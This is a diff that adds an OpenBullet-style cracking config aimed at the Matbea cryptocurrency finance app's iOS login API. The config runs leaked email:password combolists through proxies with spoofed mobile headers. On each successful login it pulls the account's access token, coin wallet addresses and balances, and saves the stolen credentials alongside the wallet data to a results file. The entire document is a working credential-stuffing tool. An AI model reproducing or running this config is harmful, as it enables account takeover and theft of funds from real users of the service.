@@ -1,0 +1,99 @@
+[SETTINGS]
+{
+  "Name": "Matebea(Finance) iOS Api",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-23T00:01:24.4797521+04:00",
+  "AdditionalInfo": "Matebea - Finance(Cashout) App - Russian Combolist ",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "?m?m?m?m?m?m?m?m-?m?m?m?m-4?m?m?m-?m?m?m?m-?m?m?m?m?m?m?m?m?m?m?m?m" -> VAR "guid" 
+
+FUNCTION GetRandomUA -> VAR "UA" 
+
+#GET_TOKEN REQUEST GET "https://matbea.com/en/api/auth/login-by-email" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TOKEN PARSE "<SOURCE>" CSS "[name=csrf_token]" "value" -> VAR "TOKEN" 
+
+#LOGIN REQUEST POST "https://matbea.com/en/api/auth/login-by-email" 
+  CONTENT "csrf_token=<TOKEN>&deviceToken=ezsdq8QdLkcIs0zECOg93B%3AAPA91bGMlbeKpZLUwuay0Pne5EzZxovsHCSq7geDUkr_pS3jWVmnotZKS7goR8j3mLAtRZghLNSX0wjk_k7JyG-NAvvG-PrW9J9E6X3oDpUzKAmQP4URl4QuH0tbmEqy06Riw69mcolq&email=<USER>&password=<PASS>&send=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: matbea.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: xmlhttprequest" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Mobile-Guid: <guid>" 
+  HEADER "Accept-Language: en" 
+  HEADER "Mobile-Platform: ios" 
+  HEADER "Content-Length: 286" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+  KEYCHAIN Success OR 
+    KEY "success" 
+    KEY "accessToken" 
+
+#accessToken PARSE "<SOURCE>" JSON "accessToken" -> VAR "accessToken" 
+
+#GET_COINADDY REQUEST GET "https://matbea.com/en/api/account/get-my-coin-addresses?csrf_token=<TOKEN>" 
+  
+  HEADER "Host: matbea.com" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: xmlhttprequest" 
+  HEADER "Mobile-Platform: ios" 
+  HEADER "Mobile-Guid: <guid>" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept-Language: en" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"type\":\"success" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "\"type\":\"success" 
+
+#coinAddress PARSE "<SOURCE>" LR "\"coinAddress\":\"" "\"" Recursive=TRUE -> VAR "coinAddress" 
+
+#Balance PARSE "<SOURCE>" JSON "receivedBalance" Recursive=TRUE CreateEmpty=FALSE -> CAP "Balance" 
+
+#AUTHOR FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By " 
+
+#SAVE UTILITY File "Matbea (Results).txt" AppendLines "<USER>:<PASS> | WalletAddress: <coinAddress> || Wallet: <Balance> || Config By T.me/YashvirGamingAdmin" 
+
